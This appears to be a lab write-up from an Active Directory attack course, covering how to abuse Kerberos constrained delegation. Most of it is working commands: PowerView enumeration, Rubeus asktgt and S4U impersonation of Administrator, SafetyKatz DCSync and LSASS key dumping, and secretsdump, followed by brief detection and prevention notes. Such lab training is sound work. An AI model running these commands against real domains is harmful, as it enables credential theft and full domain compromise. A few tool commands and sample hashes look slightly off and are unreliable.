# Learning Objective 16

**Date:** 13 August 2026


---

## Objective Overview

**Part 1: User Accounts with Constrained Delegation**
1. Enumerate users with constrained delegation enabled
2. Request TGT from DC
3. Obtain TGS for configured delegation service
4. Pass ticket and access service as Domain Admin

**Part 2: Computer Accounts with Constrained Delegation**
1. Enumerate computers with constrained delegation
2. Request TGT from DC
3. Use TGS to execute DCSync attack

---

## Prerequisites

- **Access to constrained delegation accounts/computers**
- **Credentials or hash of delegation-enabled account**
- **Rubeus.exe** for TGT/TGS manipulation
- **DC network access**
- **PowerView or ActiveDirectory Module** for enumeration

---

## Part 1: User Accounts with Constrained Delegation

---

## Step 1: Enumerate Users with Constrained Delegation

**Using PowerView:**

```powershell
Get-DomainUser -TrustedToAuth
```

Lists all user accounts with `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION`.

---

**Using ActiveDirectory Module:**

```powershell
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo | 
  Select-Object Name, @{Name="DelegationTargets"; Expression={$_."msDS-AllowedToDelegateTo"}}
```

Shows users and their delegation targets.

---

**Example output:**

```
Name: websvc
DelegationTargets: {cifs/dcorp-mssql.dollarcorp.moneycorp.local}

Name: appsvc
DelegationTargets: {ldap/dcorp-dc.dollarcorp.moneycorp.local, cifs/dcorp-appsrv.dollarcorp.moneycorp.local}
```

---

## Step 2: Get Credentials/Hash of Delegation User

**Option 1: Password compromise**

```powershell
$cred = Get-Credential -UserName dollarcorp\websvc
```

Use known password.

---

**Option 2: Hash extraction (if DA or compromised machine)**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\websvc" "exit"
```

Extract websvc hash via DCSync.

---

**Option 3: NTLM relay or password spray**

```powershell
Invoke-UserHunter -GroupName "Domain Users" -CheckAccess
```

Find accessible systems with websvc account.

---

**Example hash output:**

```
websvc:500:aad3b435b51404eeaad3b435b51404ee:a102ad5753f4c441e3af31c97fad86fd:::
```

Extract NTLM: `a102ad5753f4c441e3af31c97fad86fd`

---

## Step 3: Request TGT for Delegation User

**Using Rubeus to request TGT:**

```powershell
Rubeus.exe asktgt 
  /user:websvc 
  /rc4:a102ad5753f4c441e3af31c97fad86fd 
  /domain:dollarcorp.moneycorp.local 
  /dc:dcorp-dc.dollarcorp.moneycorp.local 
  /ptt
```

**Parameters:**
- `/user:websvc` — Delegation user account
- `/rc4` — NTLM hash of websvc
- `/domain` — Domain FQDN
- `/dc` — Domain Controller
- `/ptt` — Pass-the-ticket (load immediately)

---

**Alternative: AES256 hash (more stealthy)**

```powershell
Rubeus.exe asktgt 
  /user:websvc 
  /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 
  /domain:dollarcorp.moneycorp.local 
  /ptt
```

---

## Step 4: Request TGS for Delegation Service

**Use S4U to request service ticket:**

```powershell
Rubeus.exe s4u 
  /ticket:<tgt_from_step3> 
  /user:websvc 
  /rc4:a102ad5753f4c441e3af31c97fad86fd 
  /impersonateuser:Administrator 
  /msdsspn:cifs/dcorp-mssql.dollarcorp.moneycorp.local 
  /ptt
```

**Parameters:**
- `/ticket` — TGT from Step 3
- `/user:websvc` — Delegation user
- `/impersonateuser:Administrator` — Impersonate as DA
- `/msdsspn:cifs/...` — Target service from msDS-AllowedToDelegateTo
- `/ptt` — Load ticket into memory

---

## Step 5: Access Service as Domain Admin

**Verify ticket loaded:**

```powershell
klist
```

Should show TGS for cifs/dcorp-mssql as Administrator.

---

**Access SMB share on delegated computer:**

```powershell
dir \\dcorp-mssql.dollarcorp.moneycorp.local\C$
```

Access C$ share as Administrator via constrained delegation.

---

**Alternative: Access other services**

```powershell
# LDAP query as DA
Get-ADUser -Identity Administrator -Server dcorp-dc

# Remote registry as DA
reg query \\dcorp-mssql\HKLM\Software

# WMI as DA
Get-WmiObject -Class Win32_Process -ComputerName dcorp-mssql
```

---

## Complete Workflow: User Constrained Delegation

```
1. Enumerate users with TrustedToAuth flag
   ↓
2. Identify delegation targets (msDS-AllowedToDelegateTo)
   ↓
3. Obtain credentials/hash of delegation user
   ↓
4. Request TGT as delegation user
   ↓
5. Use S4U to request TGS for delegated service
   ↓
6. Impersonate Administrator in S4U request
   ↓
7. Load TGS into memory (/ptt)
   ↓
8. Access delegated service as Administrator
   ↓
9. Full access to delegated computer/resource
```

---

## Part 2: Computer Accounts with Constrained Delegation

---

## Step 1: Enumerate Computers with Constrained Delegation

**Using PowerView:**

```powershell
Get-DomainComputer -TrustedToAuth
```

Lists all computer accounts with constrained delegation.

---

**Using ActiveDirectory Module:**

```powershell
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo | 
  Select-Object Name, @{Name="DelegationTargets"; Expression={$_."msDS-AllowedToDelegateTo"}}
```

---

**Example output:**

```
Name: dcorp-adminsrv$
DelegationTargets: {ldap/dcorp-dc.dollarcorp.moneycorp.local}

Name: dcorp-appsrv$
DelegationTargets: {cifs/dcorp-fileserver.dollarcorp.moneycorp.local}
```

---

## Step 2: Get Machine Account Hash

**Option 1: Via Security Descriptor Backdoor (from earlier persistence)**

```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-adminsrv -Verbose
```

Extract machine account hash.

---

**Option 2: Via DCSync (if DA)**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\dcorp-adminsrv$" "exit"
```

---

**Option 3: If local admin on computer**

```powershell
SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
```

Dump machine account from LSASS.

---

**Example output:**

```
dcorp-adminsrv$: NTLM = a102ad5753f4c441e3af31c97fad86fd
dcorp-adminsrv$: AES256 = db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445
```

---

## Step 3: Request TGT for Machine Account

```powershell
Rubeus.exe asktgt 
  /user:dcorp-adminsrv$ 
  /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 
  /domain:dollarcorp.moneycorp.local 
  /ptt
```

**Parameters:**
- `/user:dcorp-adminsrv$` — Machine account
- `/aes256` — Machine account AES256 hash
- `/ptt` — Load immediately

---

## Step 4: Request TGS for LDAP/DC Access

**Use S4U to request TGS to LDAP on DC:**

```powershell
Rubeus.exe s4u 
  /user:dcorp-adminsrv$ 
  /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 
  /impersonateuser:Administrator 
  /msdsspn:ldap/dcorp-dc.dollarcorp.moneycorp.local 
  /ptt
```

Now have Administrator's LDAP ticket to DC.

---

## Step 5: Execute DCSync Attack

**With Administrator LDAP ticket loaded, extract domain hashes:**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

Extract KRBTGT hash as Administrator.

---

**Extract all domain hashes:**

```powershell
SafetyKatz.exe "lsadump::dcsync /all" "exit"
```

---

**Or use secretsdump (Python/Impacket):**

```bash
secretsdump.py -just-dc -no-pass DOLLARCORP.LOCAL/Administrator@dcorp-dc.dollarcorp.moneycorp.local
```

---

## Complete Workflow: Computer Constrained Delegation

```
1. Enumerate computers with TrustedToAuth flag
   ↓
2. Identify LDAP/DC in delegation targets
   ↓
3. Obtain machine account AES256 hash
   ↓
4. Request TGT as machine account
   ↓
5. Use S4U to request LDAP TGS to DC
   ↓
6. Impersonate Administrator
   ↓
7. Load LDAP TGS into memory (/ptt)
   ↓
8. Execute DCSync as Administrator
   ↓
9. Extract KRBTGT and all domain hashes
   ↓
10. Domain Admin compromise (via Golden Ticket)
```

---

## Key Differences: User vs Computer Delegation

| Aspect | User Account | Computer Account |
|---|---|---|
| Account | Regular service user | Machine account |
| Hash | Often weak (crackable) | Strong (128+ chars) |
| Delegation target | Various services | Usually LDAP/CIFS |
| Compromise path | User password spray/crack | Machine hash extraction |
| Impact | Service-level access | Domain Admin (DCSync) |

---

## Why Computer Delegation = DCSync

**Computer accounts with LDAP delegation:**
- Machine running with SYSTEM privileges
- LDAP delegation to DC
- Can impersonate any user (S4U2Self)
- Request LDAP ticket to DC as Administrator
- DCSync accesses LDAP replication
- Extract all domain hashes

---

## Command Reference

| Task | Command |
|---|---|
| Enumerate users | `Get-DomainUser -TrustedToAuth` |
| Enumerate computers | `Get-DomainComputer -TrustedToAuth` |
| View targets | `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"}` |
| Request user TGT | `Rubeus.exe asktgt /user:websvc /rc4:<hash> /ptt` |
| Request computer TGT | `Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:<hash> /ptt` |
| S4U request | `Rubeus.exe s4u /ticket:<tgt> /impersonateuser:Administrator /msdsspn:ldap/dc /ptt` |
| Verify tickets | `klist` |
| DCSync | `SafetyKatz.exe "lsadump::dcsync /user:dcorp\\krbtgt"` |

---

## Detection

**What logs:**
- TGS request events (4769)
- S4U events (4769 with impersonation)
- DCSync LDAP queries

**What doesn't log:**
- Constrained delegation enumeration
- TGT request (if not monitored)
- Ticket loading (/ptt is local)

---

## Prevention

- **Audit constrained delegation** — who has it enabled?
- **Minimize delegation** — only enable if necessary
- **Disable for sensitive accounts** — protect DA/EA accounts
- **Monitor LDAP delegation** — especially to DCs
- **Monitor S4U events** — track impersonation
- **Implement PKI** — reduce reliance on password-based auth
- **Protected Users group** — prevent delegation abuse

---

## Real-World Scenarios

**Scenario 1: Web Service Delegation**
```
websvc (user) → CIFS/mssql delegation
Attacker has websvc hash
→ Request TGS for mssql as Administrator
→ Access SQL server resources as DA
→ Exfiltrate data
```

**Scenario 2: Admin Server Delegation**
```
adminsrv (computer) → LDAP/dc delegation
Attacker compromises adminsrv
→ Extract machine account hash
→ Request LDAP TGS to DC as Administrator
→ Execute DCSync
→ Extract all domain hashes
→ Create Golden Tickets
```

---

## Key Takeaway

```
Constrained Delegation User Accounts:
- Compromise user account
- Request TGT & TGS via S4U
- Access delegated service as DA

Constrained Delegation Computer Accounts:
- Compromise or extract machine account hash
- Request TGT & TGS (especially LDAP to DC)
- Execute DCSync as Administrator
- Extract all domain hashes
- Domain Admin + Golden Tickets = Full Forest Control
```

---

## References

- [Rubeus - S4U & Delegation](https://github.com/GhostPack/Rubeus)
- [Constrained Delegation (Harmj0y)](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [SafetyKatz - DCSync](https://github.com/GhostPack/SafetyKatz)
- [Active Directory Delegation Security (Microsoft)](https://docs.microsoft.com/en-us/windows/win32/secauthn/kerberos-authentication)

---

*Next: Learning Objective 17 — Resource-Based Constrained Delegation (RBCD)*
